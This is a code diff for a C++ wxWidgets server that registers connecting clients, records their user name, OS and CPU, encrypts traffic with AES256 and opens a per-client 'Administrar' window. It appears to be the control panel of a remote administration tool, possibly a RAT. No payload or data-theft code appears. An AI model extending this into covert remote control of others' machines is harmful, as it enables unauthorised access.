@@ -226,16 +226,20 @@ void Servidor::m_Escucha(){
         if(sckNuevoCliente._sckSocket != INVALID_SOCKET){
             //Socket nuevo hereda non_block del mainsocket
             
-            std::string strTmp = sckNuevoCliente._strIp;
-            strTmp.append(1, ':');
-            strTmp.append(sckNuevoCliente._strPuerto);
+            std::string strtmpIP = sckNuevoCliente._strIp;
+            strtmpIP.append(1, ':');
+            strtmpIP.append(sckNuevoCliente._strPuerto);
 
-            //Leer version y SO
-            char cBuff[1024];
-            memset(&cBuff, 0, 1024);
-            int iR = this->cRecv(sckNuevoCliente._sckSocket, cBuff, 1024, 0, true);
-
-            struct Cliente structNuevoCliente = { sckNuevoCliente._sckSocket, time(0), RandomID(7), strTmp, cBuff};
+            //Leer config inicial user, so, cpu
+            char cBuff[2048];
+            memset(&cBuff, 0, 2048);
+            int iR = this->cRecv(sckNuevoCliente._sckSocket, cBuff, 2048, 0, true);
+            std::cout << cBuff << "\n";
+            std::vector<std::string> vcDatos = strSplit(std::string(cBuff), '\\', 5);
+            std::string strTmpId = RandomID(7); 
+            strTmpId.append(1, '-');
+            strTmpId += std::to_string(sckNuevoCliente._sckSocket);
+            struct Cliente structNuevoCliente = { sckNuevoCliente._sckSocket, time(0), strTmpId, strtmpIP, vcDatos[0], vcDatos[1], vcDatos[2]};
             
             std::unique_lock<std::mutex> lock(vector_mutex);
             this->vc_Clientes.push_back(structNuevoCliente);
@@ -251,8 +255,10 @@ void Servidor::m_Escucha(){
 
 void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
     m_listCtrl->InsertItem(this->iCount, wxString(p_Cliente._id));
-    m_listCtrl->SetItem(this->iCount, 1, wxString(p_Cliente._strIp));
-    m_listCtrl->SetItem(this->iCount, 2, wxString(p_Cliente._strSo));
+    m_listCtrl->SetItem(this->iCount, 1, wxString(p_Cliente._strUser));
+    m_listCtrl->SetItem(this->iCount, 2, wxString(p_Cliente._strIp));
+    m_listCtrl->SetItem(this->iCount, 3, wxString(p_Cliente._strSo));
+    m_listCtrl->SetItem(this->iCount, 4, wxString(p_Cliente._strCpu));
 }
 
 void Servidor::m_RemoverClienteLista(std::string p_ID){
@@ -329,7 +335,7 @@ int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool i
             strOut.append(1, c);
             iRecibido++;
         }
-        memccpy(pBuffer, strOut.c_str(), '\0', 1024);
+        _memccpy(pBuffer, strOut.c_str(), '\0', 1024);
 
         //Restaurar
         iBlock = 1;
@@ -363,7 +369,7 @@ int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool i
 
 //AES256
 ByteArray Servidor::bEnc(const unsigned char* pInput, size_t pLen) {
-    this->Init_Key();
+    //this->Init_Key();
     ByteArray bOutput;
     ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
     if (enc_len <= 0) {
@@ -373,7 +379,7 @@ ByteArray Servidor::bEnc(const unsigned char* pInput, size_t pLen) {
 }
 
 ByteArray Servidor::bDec(const unsigned char* pInput, size_t pLen) {
-    this->Init_Key();
+    //this->Init_Key();
     ByteArray bOutput;
     ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
     if (dec_len <= 0) {
@@ -386,10 +392,9 @@ ByteArray Servidor::bDec(const unsigned char* pInput, size_t pLen) {
 void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {
     
     wxMenu menu;
-    menu.Append(EnumIDS::ID_Interactuar, "Interactuar");
-    menu.Append(wxID_ABOUT, "&About");
+    menu.Append(EnumIDS::ID_Interactuar, "Administrar");
     menu.AppendSeparator();
-    menu.Append(wxID_EXIT, "E&xit");
+    menu.Append(wxID_ANY, ":v");
 
     PopupMenu(&menu, pos.x, pos.y);
 }
@@ -420,8 +425,12 @@ void MyListCtrl::OnContextMenu(wxContextMenuEvent& event)
         }
 
         wxString st1 = this->GetItemText(iItem, 0);
-        std::cout << iItem<< " - "<<st1<<"\n";
         this->strTmp = st1;
+        this->strTmp.append(1, '/');
+        this->strTmp += this->GetItemText(iItem, 1);
+        this->strTmp.append(1, '/');
+        this->strTmp += this->GetItemText(iItem, 2);
+
         ShowContextMenu(point, iItem);
     }
     else
@@ -434,10 +443,10 @@ void MyListCtrl::OnContextMenu(wxContextMenuEvent& event)
 }
 
 void MyListCtrl::OnInteractuar(wxCommandEvent& event) {
-    long lFound = this->FindItem(0, this->strTmp.ToStdString());
+    //long lFound = this->FindItem(0, vcOut[0]);
+    std::vector<std::string> vcOut = strSplit(strTmp.ToStdString(), '/', 2);
     
-
-    FrameCliente* n_FrameCli = new FrameCliente(this->strTmp.ToStdString());
+    FrameCliente* n_FrameCli = new FrameCliente(this->strTmp.ToStdString(), 2);
     n_FrameCli->Show(true);
 }
 
